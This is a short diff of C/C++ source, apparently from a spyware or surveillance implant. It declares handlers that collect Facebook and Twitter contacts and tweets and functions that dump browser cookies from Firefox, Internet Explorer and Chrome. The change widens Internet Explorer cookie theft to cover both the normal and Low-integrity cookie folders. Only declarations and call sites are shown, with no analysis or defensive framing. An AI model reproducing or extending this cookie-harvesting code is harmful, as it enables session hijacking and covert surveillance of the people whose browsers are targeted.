@@ -22,7 +22,7 @@ extern DWORD HandleFBContacts(char *); // Handler per FaceBook
 extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
 extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
 extern int DumpFFCookies(void); // Cookie per Facebook
-extern int DumpIECookies(void); // Cookie per IExplorer
+extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
 extern int DumpCHCookies(void); // Cookie per Chrome
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
@@ -175,7 +175,8 @@ void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *auth
 void DumpNewCookies()
 {
 	ResetNewCookie();
-	DumpIECookies();
+	DumpIECookies(L"Microsoft\\Windows\\Cookies");
+	DumpIECookies(L"Microsoft\\Windows\\Cookies\\Low");
 	DumpFFCookies();
 	DumpCHCookies();
 }
